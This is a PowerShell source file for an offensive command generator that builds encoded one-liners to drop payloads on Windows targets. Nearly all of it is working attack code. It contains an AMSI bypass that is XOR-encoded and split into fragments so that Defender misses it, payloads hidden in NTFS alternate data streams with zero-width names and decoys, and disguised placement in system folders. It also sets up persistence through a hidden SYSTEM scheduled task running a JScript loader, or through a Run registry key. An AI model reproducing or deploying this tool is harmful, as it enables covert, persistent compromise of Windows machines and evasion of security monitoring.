<#
.SYNOPSIS
    ADS-OneLiner.ps1 - Minimal Command Generator for Windows Targets

.DESCRIPTION
    Runs on Linux (Kali) to generate minimal PowerShell commands for Windows deployment.
    Calls ADS-Dropper.ps1 internally to compute configuration, then outputs only the
    essential commands needed on the Windows target.

    NO full script upload needed - just copy/paste the generated commands.

.PARAMETER Payload
    Payload content (required unless -PayloadFile or -PayloadAtDeployment).
    WARNING: Passing payloads containing $ variables via -Payload on the command
    line is unreliable because bash and pwsh both expand $ in double-quoted strings.
    Use -PayloadFile instead for payloads containing $ variables.

.PARAMETER PayloadFile
    Path to a file containing the payload. The file is read verbatim with
    Get-Content -Raw, bypassing all shell expansion issues. This is the
    RECOMMENDED way to pass payloads containing $ variables, registry paths,
    or any other special characters.

.PARAMETER PayloadAtDeployment
    Prompt for payload on Windows target instead of baking it in

.PARAMETER ZeroWidthStreams
    Enable zero-width Unicode stream names

.PARAMETER ZeroWidthMode
    'single', 'multi', or 'hybrid'

.PARAMETER HybridPrefix
    Prefix for hybrid mode (e.g., 'Zone.Identifier')

.PARAMETER Persist
    'task', 'registry', 'wmi', or 'none'

.PARAMETER CreateDecoys
    Number of decoy streams (0-10)

.PARAMETER Encrypt
    Enable AES-256 encryption

.PARAMETER Randomize
    Randomize host file name

.PARAMETER OutputFile
    Where to save generated commands (default: ads-payload.txt)

.PARAMETER ManifestDir
    Manifest directory on Linux (default: ./manifests)

.PARAMETER NoAmsi
    Opt out of AMSI bypass (bypass is ON by default)

.EXAMPLE
    # Simple payload (no $ variables):
    pwsh ADS-OneLiner.ps1 -Payload "Write-Host 'Test'" -Persist task

    # Payload with $ variables — use -PayloadFile to avoid shell expansion:
    pwsh ADS-OneLiner.ps1 -PayloadFile ./my-payload.ps1 -Persist task -ZeroWidthStreams

.NOTES
    Author: Qweary
    Version: 2.2.3 (Command Generator - PayloadFile + Expansion Safety)
    Requires: ADS-Dropper.ps1 in ./src/ or same directory
#>

[CmdletBinding()]
param(
    [string]$Payload,
    [string]$PayloadFile,
    [switch]$PayloadAtDeployment,
    
    [switch]$ZeroWidthStreams,
    
    [ValidateSet('single', 'multi', 'hybrid')]
    [string]$ZeroWidthMode = 'single',
    
    [string]$HybridPrefix,
    
    [ValidateSet('task', 'registry', 'wmi', 'none')]
    [string]$Persist = 'task',
    
    [ValidateRange(0, 10)]
    [int]$CreateDecoys = 0,
    
    [switch]$Encrypt,
    [switch]$Randomize,
    
    # Deep placement - resolve path on target at runtime
    [switch]$UseDeepPlacement,
    # Attach to existing file on target instead of creating new
    [switch]$AttachToExisting,
    
    # Multi-instance: deploy N independent copies with unique paths/tasks
    [ValidateRange(1, 20)]
    [int]$InstanceCount = 1,
    
    [string]$OutputFile = "ads-payload.txt",
    [string]$ManifestDir = "./manifests",

    # Opt out of AMSI bypass (bypass is ON by default)
    [switch]$NoAmsi
)

Write-Host "`n╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║ ADS Minimal Command Generator v2.2.3                  ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════════╝`n" -ForegroundColor Cyan

# ============================================================
# PAYLOAD INPUT VALIDATION
# ============================================================

# Handle -PayloadFile: read file contents, bypassing all shell expansion
if ($PayloadFile) {
    if (-not (Test-Path $PayloadFile)) {
        Write-Error "PayloadFile not found: $PayloadFile"
        exit 1
    }
    try {
        $Payload = Get-Content $PayloadFile -Raw -ErrorAction Stop
        Write-Host "[+] Payload read from file: $PayloadFile ($($Payload.Length) chars)" -ForegroundColor Green
    } catch {
        Write-Error "Failed to read PayloadFile: $_"
        exit 1
    }
}

if (-not $Payload -and -not $PayloadAtDeployment) {
    Write-Error "Provide -Payload, -PayloadFile, or use -PayloadAtDeployment"
    exit 1
}

# ============================================================
# EXPANSION CORRUPTION DETECTION
# ============================================================
# When a payload containing $ variables is passed via -Payload "..."
# on the command line, bash and/or pwsh expand those variables to
# empty strings BEFORE this script runs. Detect common corruption
# patterns and warn the user to use -PayloadFile instead.
# ============================================================
if ($Payload -and -not $PayloadFile -and -not $PayloadAtDeployment) {
    $corruptionHints = 0
    # Pattern: "; ='value'" — a bare = where "$var='value'" was intended
    if ($Payload -match ';\s*=\s*''') { $corruptionHints++ }
    # Pattern: "Test-Path )" — empty argument where "$var" was intended
    if ($Payload -match 'Test-Path\s*\)') { $corruptionHints++ }
    # Pattern: "-Path  -" — empty -Path value (double space before next param)
    if ($Payload -match '-Path\s{2,}-') { $corruptionHints++ }
    # Pattern: parameter flags with no value where $true/$false was expected
    if ($Payload -match '-\w+Monitoring\s+(-|;|$)') { $corruptionHints++ }
    if ($Payload -match '-\w+Protection\s+(-|;|$)') { $corruptionHints++ }

    if ($corruptionHints -ge 2) {
        Write-Host ""
        Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Red
        Write-Host "║ WARNING: Payload appears corrupted by shell expansion!   ║" -ForegroundColor Red
        Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Red
        Write-Host ""
        Write-Host "  The payload looks like `$ variables were expanded to empty" -ForegroundColor Yellow
        Write-Host "  strings by bash or pwsh before this script received them." -ForegroundColor Yellow
        Write-Host ""
        Write-Host "  FIX: Save your payload to a file and use -PayloadFile:" -ForegroundColor White
        Write-Host '    echo ''your payload here'' > payload.ps1' -ForegroundColor Gray
        Write-Host '    pwsh ADS-OneLiner.ps1 -PayloadFile ./payload.ps1 ...' -ForegroundColor Gray
        Write-Host ""
        Write-Host "  Detected $corruptionHints corruption pattern(s)." -ForegroundColor DarkGray
        Write-Host "  Continuing anyway (output will be broken)..." -ForegroundColor DarkGray
        Write-Host ""
    }
}

# ============================================================
# AMSI BYPASS GENERATION FUNCTIONS
# ============================================================
# These run on Linux at generation time to produce XOR-encoded
# byte arrays. The encoded data is embedded in the generated
# script. On the Windows target, only byte arrays + a generic
# XOR decode loop appear in the source text — no flagged strings
# or reflection patterns. Each decoded fragment is IEXed
# separately so no single AMSI scan event sees the full
# .GetType().GetField().SetValue() chain.
# ============================================================

function New-XorKey {
    <#
    .SYNOPSIS
        Generate a random XOR key (avoids 0x00 and common ASCII)
    #>
    # Range 0x30-0x7E avoids null and control chars
    return [byte](Get-Random -Minimum 0x30 -Maximum 0x7F)
}

function ConvertTo-XorBytes {
    <#
    .SYNOPSIS
        XOR-encode a string into a byte array string for embedding
    #>
    param([string]$Text, [byte]$Key)
    $bytes = $Text.ToCharArray() | ForEach-Object { [byte]([int][char]$_ -bxor $Key) }
    return ($bytes -join ',')
}

function New-AmsiBypassLayerA {
    <#
    .SYNOPSIS
        Generates Layer A AMSI bypass code using XOR-encoded fragment splitting.
        
    .DESCRIPTION
        Produces PowerShell code where the source text contains only:
        - A byte XOR key
        - A generic decode function
        - Byte arrays (just numbers)
        - IEX calls on decoded fragments
        
        No flagged strings, type names, or reflection patterns appear in
        the source text. Each decoded fragment contains only ONE step of
        the reflection chain, exploiting the fact that Defender does not
        correlate across separate AMSI scan events.

    .OUTPUTS
        [string] PowerShell code ready for embedding in $minimalScript
    #>
    $xk = New-XorKey

    # Four fragments using PowerShell dynamic dispatch: $obj."$method"(args)
    # This avoids the PSMethod.Invoke() pitfall where passing $self as
    # first arg triggers wrong method overloads (the "must not specify an
    # assembly" bug). Each fragment is individually benign to AMSI.
    $fragA = '$script:_ra=[Ref].Assembly;$script:_m1="Ge"+"tTy"+"pe"'
    $fragB = '$script:_tp=$script:_ra."$($script:_m1)"(("Sys"+"tem.Mana"+"gement.Auto"+"mation."+"Am"+"si"+"Uti"+"ls"))'
    $fragC = '$script:_m2="Get"+"Fie"+"ld";$script:_fd=$script:_tp."$($script:_m2)"(("am"+"siIn"+"itFa"+"iled"),("Non"+"Publ"+"ic,Sta"+"tic"))'
    $fragD = '$script:_m3="Set"+"Val"+"ue";$script:_fd."$($script:_m3)"($null,$true)'

    $encA = ConvertTo-XorBytes $fragA $xk
    $encB = ConvertTo-XorBytes $fragB $xk
    $encC = ConvertTo-XorBytes $fragC $xk
    $encD = ConvertTo-XorBytes $fragD $xk

    # Build the one-liner: decode function + try/catch around fragment IEX loop
    $keyHex = "0x{0:X2}" -f $xk
    return "`$_xk=$keyHex;function _xd([byte[]]`$d,[byte]`$k){-join(`$d|%{[char](`$_ -bxor `$k)})};try{@(,@($encA),@($encB),@($encC),@($encD))|%{IEX(_xd `$_ `$_xk)}}catch{}"
}

function New-AmsiBypassLayerB {
    <#
    .SYNOPSIS
        Generates Layer B AMSI bypass for JScript wrapper context.
        
    .DESCRIPTION
        Same XOR fragment approach but formatted as a PowerShell -Command
        string that will be concatenated inside a JScript wrapper.
        The JScript launches powershell.exe with this bypass prepended
        to the actual payload execution.

    .OUTPUTS
        [string] PowerShell code suitable for JScript string concatenation.
        Includes proper escaping for the JScript → PowerShell → execution chain.
    #>
    $xk = New-XorKey

    $fragA = '$script:_ra=[Ref].Assembly;$script:_m1="Ge"+"tTy"+"pe"'
    $fragB = '$script:_tp=$script:_ra."$($script:_m1)"(("Sys"+"tem.Mana"+"gement.Auto"+"mation."+"Am"+"si"+"Uti"+"ls"))'
    $fragC = '$script:_m2="Get"+"Fie"+"ld";$script:_fd=$script:_tp."$($script:_m2)"(("am"+"siIn"+"itFa"+"iled"),("Non"+"Publ"+"ic,Sta"+"tic"))'
    $fragD = '$script:_m3="Set"+"Val"+"ue";$script:_fd."$($script:_m3)"($null,$true)'

    $encA = ConvertTo-XorBytes $fragA $xk
    $encB = ConvertTo-XorBytes $fragB $xk
    $encC = ConvertTo-XorBytes $fragC $xk
    $encD = ConvertTo-XorBytes $fragD $xk

    $keyHex = "0x{0:X2}" -f $xk

    # For JScript context: this string will be concatenated inside a JScript
    # string that builds a powershell.exe -Command "..." invocation.
    # The $ signs need to survive: JScript → cmd.exe → PowerShell
    # In the JScript here-string context of Build-DeployBlock, $ is literal
    # (no JScript expansion), so we just need valid PowerShell syntax.
    return "`$_xk=$keyHex;function _xd([byte[]]`$d,[byte]`$k){-join(`$d|%{[char](`$_ -bxor `$k)})};try{@(,@($encA),@($encB),@($encC),@($encD))|%{IEX(_xd `$_ `$_xk)}}catch{};"
}

function New-AmsiBypassForRegistry {
    <#
    .SYNOPSIS
        Generates AMSI bypass for registry Run key value.
        
    .DESCRIPTION
        Similar to Layer B but must be compact enough for a registry value
        string. Uses the same XOR fragment approach.

    .OUTPUTS
        [string] PowerShell code for registry -Value parameter
    #>
    # Reuse Layer B format — it's already a single-line string
    return New-AmsiBypassLayerB
}

# Locate ADS-Dropper.ps1
$possiblePaths = @(
    (Join-Path $PSScriptRoot 'ADS-Dropper.ps1')
    (Join-Path $PSScriptRoot 'src/ADS-Dropper.ps1')
    './ADS-Dropper.ps1'
    './src/ADS-Dropper.ps1'
)

$adsDropperPath = $null
foreach ($path in $possiblePaths) {
    if (Test-Path $path) {
        $adsDropperPath = $path
        break
    }
}

if (-not $adsDropperPath) {
    Write-Error "ADS-Dropper.ps1 not found. Searched: $($possiblePaths -join ', ')"
    exit 1
}

Write-Host "[*] Using ADS-Dropper: $adsDropperPath" -ForegroundColor Gray

# Call ADS-Dropper.ps1 in GenerateOnly mode to get configuration
Write-Host "[*] Generating configuration..." -ForegroundColor White

$params = @{
    Payload = if ($PayloadAtDeployment) { "PLACEHOLDER" } else { $Payload }
    ZeroWidthStreams = $ZeroWidthStreams
    ZeroWidthMode = $ZeroWidthMode
    Persist = $Persist
    Randomize = $Randomize
    Encrypt = $Encrypt
    CreateDecoys = $CreateDecoys
    UseDeepPlacement = $UseDeepPlacement
    AttachToExisting = $AttachToExisting
    GenerateOnly = $true
}

if ($HybridPrefix) { $params.HybridPrefix = $HybridPrefix }

try {
    $config = & $adsDropperPath @params
} catch {
    Write-Error "Failed to generate configuration: $_"
    exit 1
}

Write-Host "[+] Configuration computed" -ForegroundColor Green
Write-Host "    Host: $($config.HostPath)" -ForegroundColor Gray
Write-Host "    Stream: $($config.StreamNameEscaped)" -ForegroundColor Gray
Write-Host "    Task: $($config.TaskName)" -ForegroundColor Gray
if ($InstanceCount -gt 1) {
    Write-Host "    Instances: $InstanceCount (each gets unique path/stream/task)" -ForegroundColor Yellow
}
if (-not $NoAmsi) {
    Write-Host "    AMSI Bypass: Enabled - XOR Fragment Splitting (Layer A + Layer B)" -ForegroundColor Yellow
} else {
    Write-Host "    AMSI Bypass: Disabled (-NoAmsi)" -ForegroundColor DarkGray
}

# Build minimal Windows commands
Write-Host "[*] Building minimal deployment commands..." -ForegroundColor White

# Helper functions needed on Windows (minimal versions)
$helperFunctions = @'
# Host-derived AES key function
function Get-HostKey {
    $h = @($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber) -join '|'
    [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))
}

# Encrypt function (compact)
function Enc($t,$k) {
    $a=[Security.Cryptography.Aes]::Create()
    $a.Key=$k;$a.GenerateIV()
    $e=$a.CreateEncryptor()
    $p=[Text.Encoding]::UTF8.GetBytes($t)
    $b=$e.TransformFinalBlock($p,0,$p.Length)
    [Convert]::ToBase64String($a.IV+$b)
}

# Decrypt function (compact)
function Dec($d,$k) {
    $b=[Convert]::FromBase64String($d)
    $a=[Security.Cryptography.Aes]::Create()
    $a.Key=$k;$a.IV=$b[0..15]
    $c=$a.CreateDecryptor()
    $t=$b[16..($b.Length-1)]
    $p=$c.TransformFinalBlock($t,0,$t.Length)
    [Text.Encoding]::UTF8.GetString($p)
}

'@

# Start building the minimal command script
$minimalScript = ""

# Add helper functions only if encryption is enabled
if ($Encrypt) {
    $minimalScript += $helperFunctions + "`n"
}

# Configuration variables (fallback defaults — may be overridden per-instance)
$minimalScript += @"
# Configuration (fallback values)
`$_hp0='$($config.HostPath)'
`$_sn0=$($config.StreamNameEscaped)
`$_tn0='$($config.TaskName)'

"@

# ============================================================
# LAYER A: AMSI BYPASS FOR DEPLOYMENT SCRIPT
# ============================================================
# Uses XOR-encoded fragment splitting. The source text contains
# ONLY byte arrays and a generic decode loop — no flagged strings
# or reflection patterns. Each decoded fragment is IEXed in a
# separate AMSI scan event, breaking the .GetType/.GetField/
# .SetValue chain that Defender pattern-matches on.
#
# Generated fresh each run with a random XOR key, producing
# unique byte sequences every time.
# ============================================================
if (-not $NoAmsi) {
    $layerACode = New-AmsiBypassLayerA
    Write-Host "[*] Layer A bypass generated (XOR key: random, $(($layerACode.Length)) chars)" -ForegroundColor DarkGray
    $minimalScript += @"
# Runtime evasion
$layerACode

"@
}

# Payload handling (computed ONCE, before any loop)
if ($PayloadAtDeployment) {
    $minimalScript += @"
# Payload input
Write-Host 'Enter payload (press Enter twice when done):' -ForegroundColor Cyan
`$lines=@()
do{`$line=Read-Host;if(`$line){`$lines+=`$line}}while(`$line)
`$pl=`$lines-join"`n"

"@
} else {
    # Determine if payload is file path or direct content
    $actualPayload = $Payload
    
    # Check if payload looks like a file path (doesn't contain newlines and is a valid path)
    # NOTE: -PayloadFile is the preferred way to pass file-based payloads.
    # This auto-detection is kept for backward compatibility but -PayloadFile
    # should be used instead since it bypasses all shell expansion issues.
    if (-not $PayloadFile -and ($Payload -notmatch "`n") -and (Test-Path $Payload -ErrorAction SilentlyContinue)) {
        Write-Host "[*] File detected: $Payload" -ForegroundColor Yellow
        Write-Host "[*] Reading file contents..." -ForegroundColor Yellow
        try {
            $actualPayload = Get-Content $Payload -Raw -ErrorAction Stop
            Write-Host "[+] Successfully read $($actualPayload.Length) characters" -ForegroundColor Green
        } catch {
            Write-Error "Failed to read file: $_"
            exit 1
        }
    }
    
    # Escape the payload for embedding in a single-quoted string.
    # Only apostrophes need escaping inside '...' — PowerShell does NOT
    # expand $, `, or any other special chars inside single quotes.
    $escapedPayload = $actualPayload -replace "'","''"
    # IMPORTANT: Use string concatenation, NOT an expandable here-string,
    # so that $ and ` in the payload are NOT expanded at generation time.
    # The payload will be inside '...' on the target, keeping it literal.
    $minimalScript += "# Payload`n" + '$pl=''' + $escapedPayload + '''' + "`n`n"
}

# Encryption handling (computed ONCE)
if ($Encrypt) {
    $minimalScript += @"
# Encrypt payload
`$k=Get-HostKey
`$pl=Enc `$pl `$k

"@
}

# ============================================================
# DEPLOYMENT SECTION
# ============================================================

# Helper: deep placement directory list (shared by both paths)
$deepDirsBlock = @'
$_deepDirs = @(
    "$env:ProgramData\Microsoft\Windows\WER\ReportQueue",
    "$env:ProgramData\Microsoft\Windows\WER\Temp",
    "$env:LOCALAPPDATA\Microsoft\Windows\Caches",
    "$env:LOCALAPPDATA\Microsoft\Windows\WebCache",
    "$env:WINDIR\Temp",
    "$env:ProgramData\Microsoft\Diagnosis",
    "$env:ProgramData\Microsoft\Windows\Power Efficiency Diagnostics",
    "$env:ProgramData\Microsoft\Network\Downloader"
)
$_validDirs = $_deepDirs | Where-Object { Test-Path $_ }
'@

# Helper: attach-to-existing logic
$attachBlock = @'
$_found = $false
foreach ($_dir in ($_validDirs | Get-Random -Count ([Math]::Min(3, $_validDirs.Count)))) {
    $_candidate = Get-ChildItem -Path $_dir -File -EA 0 |
        Where-Object { $_.Length -gt 0 -and $_.Length -lt 5MB } |
        Select-Object -First 10 | Get-Random
    if ($_candidate) {
        $hp = $_candidate.FullName
        $_found = $true
        break
    }
}
'@

# Helper: deep placement new-file logic
$deepNewFileBlock = @'
$_names = @('Report.wer','etl_data.log','WPR_initiated.dat','snapshot.etl','diag_report.xml','cache_entry.dat','qmgr0.dat','aria-debug.log')
$hp = Join-Path ($_validDirs | Get-Random) ($_names | Get-Random)
'@

# Helper function: build the deep placement code for the generated script
function Build-DeepPlacementCode {
    $code = "# Runtime deep placement`n$deepDirsBlock`n"
    if ($AttachToExisting) {
        $code += "$attachBlock`n"
        if ($UseDeepPlacement) {
            $code += "if (-not `$_found -and `$_validDirs) {`n$deepNewFileBlock`n}`n"
        } else {
            $code += "if (-not `$_found -and `$_validDirs) {`n`$hp = Join-Path (`$_validDirs | Get-Random) ('cache_' + [guid]::NewGuid().ToString().Substring(0,6) + '.dat')`n}`n"
        }
    } elseif ($UseDeepPlacement) {
        $code += "if (`$_validDirs) {`n$deepNewFileBlock`n}`n"
    }
    return $code
}

# Helper function: build ADS write + persistence for the generated script
function Build-DeployBlock {
    $block = @"
# Create ADS (ensure parent dir exists)
`$_pd=Split-Path `$hp -Parent;if(`$_pd -and !(Test-Path `$_pd)){ni `$_pd -ItemType Directory -Force|Out-Null}
if(!(Test-Path `$hp)){ni `$hp -ItemType File -Force|Out-Null}
`$pl|sc "`$hp``:`$sn" -Force

"@

    # Decoys
    if ($CreateDecoys -gt 0) {
        $decoyNames = @('Zone.Identifier', 'Summary', 'Comments', 'Author')
        $decoyContents = @('[ZoneTransfer]`r`nZoneId=3', 'Document summary', 'Internal use only', 'System')
        for ($i = 0; $i -lt [Math]::Min($CreateDecoys, $decoyNames.Count); $i++) {
            $block += "'$($decoyContents[$i])'|sc `"`${hp}:$($decoyNames[$i])`" -Force`n"
        }
        $block += "`n"
    }

    # Persistence
    if ($Persist -eq 'task') {
        if ($Encrypt) {
            # ============================================================
            # ENCRYPTED: JScript wrapper with inline decryption functions
            # ============================================================

            # Build the AMSI bypass for Layer B (JScript wrapper)
            $jsAmsiLine = ""
            if (-not $NoAmsi) {
                $layerBCode = New-AmsiBypassLayerB
                $jsAmsiLine = @"
    "$layerBCode" +

"@
            }

            $block += @"
`$adsPath=`$hp+':'+`$sn
`$_jsBody=@'
var shell = new ActiveXObject("WScript.Shell");
var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
    "function Get-HostKey{" +
        "`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;" +
        "[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))" +
    "};" +
    "function Dec(`$d,`$k){" +
        "`$b=[Convert]::FromBase64String(`$d);" +
        "`$a=[Security.Cryptography.Aes]::Create();" +
        "`$a.Key=`$k;`$a.IV=`$b[0..15];" +
        "`$c=`$a.CreateDecryptor();" +
        "`$t=`$b[16..(`$b.Length-1)];" +
        "`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);" +
        "[Text.Encoding]::UTF8.GetString(`$p)" +
    "};" +
    "`$k=Get-HostKey;" +
    "`$e=Get-Content '__ADSPATH__' -Raw;" +
$jsAmsiLine    "`$p=Dec `$e `$k;" +
    "IEX `$p" +
    "\"";
shell.Run(cmd, 0, false);
'@
`$_jsBody=`$_jsBody.Replace('__ADSPATH__',(`$adsPath-replace'\\','\\\\'))
`$_jsDir=Split-Path `$hp -Parent;if(-not `$_jsDir){`$_jsDir=`$env:ProgramData}
`$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
`$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
`$a=New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //E:JScript ```"`$_jsPath```""
`$t1=New-ScheduledTaskTrigger -AtStartup
`$t2=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
`$t=@(`$t1,`$t2)
`$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
`$p=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Principal `$p -Force|Out-Null

"@
        } else {
            # ============================================================
            # UNENCRYPTED: JScript wrapper, simple IEX
            # ============================================================

            # Build AMSI bypass for unencrypted Layer B
            $jsAmsiLineUnenc = ""
            if (-not $NoAmsi) {
                $layerBCodeUnenc = New-AmsiBypassLayerB
                $jsAmsiLineUnenc = @"
    "$layerBCodeUnenc" +

"@
            }

            $block += @"
`$adsPath=`$hp+':'+`$sn
`$_jsBody=@'
var shell = new ActiveXObject("WScript.Shell");
var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
$jsAmsiLineUnenc    "IEX(Get-Content '__ADSPATH__' -Raw)" +
    "\"";
shell.Run(cmd, 0, false);
'@
`$_jsBody=`$_jsBody.Replace('__ADSPATH__',(`$adsPath-replace'\\','\\\\'))
`$_jsDir=Split-Path `$hp -Parent;if(-not `$_jsDir){`$_jsDir=`$env:ProgramData}
`$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
`$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
`$a=New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //E:JScript ```"`$_jsPath```""
`$t1=New-ScheduledTaskTrigger -AtStartup
`$t2=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
`$t=@(`$t1,`$t2)
`$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
`$p=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Principal `$p -Force|Out-Null

"@
        }
    } elseif ($Persist -eq 'registry') {
        # Registry persistence
        if (-not $NoAmsi) {
            $regBypass = New-AmsiBypassForRegistry
            $regBypassSafe = $regBypass -replace "'","''"
            $block += "`$_regByp='" + $regBypassSafe + "'`n"
            $block += "`$_regCmd='powershell.exe -NoP -W Hidden -C `"' + `$_regByp + 'IEX(gc ' + [char]39 + `$hp + ':' + `$sn + [char]39 + ' -Raw)`"'`n"
            $block += "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value `$_regCmd`n`n"
        } else {
            $block += "`$_regCmd='powershell.exe -NoP -W Hidden -C `"IEX(gc ' + [char]39 + `$hp + ':' + `$sn + [char]39 + ' -Raw)`"'`n"
            $block += "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value `$_regCmd`n`n"
        }
    }

    return $block
}

if ($InstanceCount -gt 1) {
    # ============================================================
    # MULTI-INSTANCE PATH
    # ============================================================
    Write-Host "[*] Building multi-instance deployment ($InstanceCount instances)..." -ForegroundColor Yellow

    $minimalScript += @"
# Multi-instance deployment: $InstanceCount independent copies
`$_instanceCount=$InstanceCount
for(`$_i=0;`$_i -lt `$_instanceCount;`$_i++){

# Per-instance: unique stream name and task name
`$sn = -join((65..90)+(97..122)|Get-Random -Count 8|ForEach-Object{[char]`$_})
`$tn = 'WinSAT_' + (-join((65..90)|Get-Random -Count 6|ForEach-Object{[char]`$_}))

"@

    if ($UseDeepPlacement -or $AttachToExisting) {
        $minimalScript += (Build-DeepPlacementCode) + "`n"
    } else {
        $minimalScript += @'
$hp = Join-Path $env:ProgramData (-join((65..90)+(97..122)|Get-Random -Count 8|ForEach-Object{[char]$_}))

'@
    }

    $minimalScript += Build-DeployBlock

    if (-not $PayloadAtDeployment -and -not $Encrypt) {
        $minimalScript += "IEX `$pl`n"
    }

    $minimalScript += @"
Write-Host "[+] Instance `$(`$_i+1)/$InstanceCount deployed" -ForegroundColor Green
}

"@

} else {
    # ============================================================
    # SINGLE INSTANCE PATH (original behavior + deep placement)
    # ============================================================

    # Use config defaults
    $minimalScript += "`$hp=`$_hp0;`$sn=`$_sn0;`$tn=`$_tn0`n`n"

    if ($UseDeepPlacement -or $AttachToExisting) {
        Write-Host "[*] Adding runtime deep placement logic..." -ForegroundColor Yellow
        $minimalScript += (Build-DeepPlacementCode) + "`n"
    }

    $minimalScript += Build-DeployBlock

    if (-not $PayloadAtDeployment -and -not $Encrypt) {
        $minimalScript += @"
# Execute payload immediately
IEX `$pl

"@
    }
}

$minimalScript += @"
Write-Host '[+] Deployment complete' -ForegroundColor Green
"@

# Base64 encode for one-liner
Write-Host "[*] Encoding for transport..." -ForegroundColor White
$bytes = [System.Text.Encoding]::Unicode.GetBytes($minimalScript)
$encoded = [Convert]::ToBase64String($bytes)

# Save manifest on Linux
if (-not $PayloadAtDeployment) {
    Write-Host "[*] Saving manifest..." -ForegroundColor White
    
    if (-not (Test-Path $ManifestDir)) {
        New-Item -Path $ManifestDir -ItemType Directory -Force | Out-Null
    }
    
    $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
    $manifestFile = Join-Path $ManifestDir "manifest-$timestamp.json"
    
    $payloadHash = (Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($(if ($actualPayload) { $actualPayload } else { $Payload })))) -Algorithm SHA256).Hash
    
    $manifest = @{
        Timestamp         = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"
        HostPath          = $config.HostPath
        StreamName        = $config.StreamName
        StreamNameEscaped = $config.StreamNameEscaped
        Codepoints        = $config.Codepoints
        TaskName          = $config.TaskName
        ZeroWidthMode     = $ZeroWidthMode
        Persistence       = $Persist
        Encrypted         = $Encrypt.IsPresent
        DecoysCount       = $CreateDecoys
        Randomized        = $Randomize.IsPresent
        DeepPlacement     = $UseDeepPlacement.IsPresent
        AttachToExisting  = $AttachToExisting.IsPresent
        InstanceCount     = $InstanceCount
        AmsiBypass        = (-not $NoAmsi)
        AmsiBypassMethod  = if (-not $NoAmsi) { "XOR Fragment Splitting v2.2.3" } else { "Disabled" }
        PayloadHash       = $payloadHash
        PayloadSource     = if ($PayloadFile) { "File: $PayloadFile" } else { "Command-line" }
        Operator          = $env:USER
        GeneratedOn       = hostname
        OutputFile        = $OutputFile
        JScriptLoaderNote = "Created at runtime: <host_dir>\windiag_<random>.js"
    }
    
    $manifest | ConvertTo-Json -Depth 10 | Out-File -FilePath $manifestFile -Encoding UTF8 -Force
    Write-Host "[+] Manifest saved to: $manifestFile" -ForegroundColor Green
}

# Generate output file
Write-Host "[*] Generating output formats..." -ForegroundColor White

$outputContent = @"
╔═══════════════════════════════════════════════════════════╗
║ ADS Minimal Deployment Commands                          ║
║ Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')                         ║
╚═══════════════════════════════════════════════════════════╝

CONFIGURATION:
  Host File: $($config.HostPath)
  Stream Name: $(if($ZeroWidthStreams){'<zero-width> (' + $config.Codepoints + ')'}else{$config.StreamName})
  Task Name: $($config.TaskName)
  Zero-Width Mode: $ZeroWidthMode
  Persistence: $Persist
  Decoys: $CreateDecoys
  Encryption: $($Encrypt.IsPresent)
  Randomized: $($Randomize.IsPresent)
  Deep Placement: $($UseDeepPlacement.IsPresent)
  Attach to Existing: $($AttachToExisting.IsPresent)
  Instances: $InstanceCount$(if($InstanceCount -gt 1){" (each gets unique path/stream/task at runtime)"})
  AMSI Bypass: $(-not $NoAmsi) (XOR Fragment Splitting - Layer A + Layer B)
  Payload Source: $(if ($PayloadFile) { "File: $PayloadFile" } else { "Command-line" })
  
PAYLOAD SIZE:
  Readable: $($minimalScript.Length) characters
  Encoded: $($encoded.Length) characters

╔═══════════════════════════════════════════════════════════╗
║ OPTION 1: Base64 Encoded One-Liner (Recommended)         ║
╚═══════════════════════════════════════════════════════════╝

powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded

╔═══════════════════════════════════════════════════════════╗
║ OPTION 2: Readable Multi-Line Commands                   ║
╚═══════════════════════════════════════════════════════════╝

$minimalScript

╔═══════════════════════════════════════════════════════════╗
║ USAGE                                                     ║
╚═══════════════════════════════════════════════════════════╝

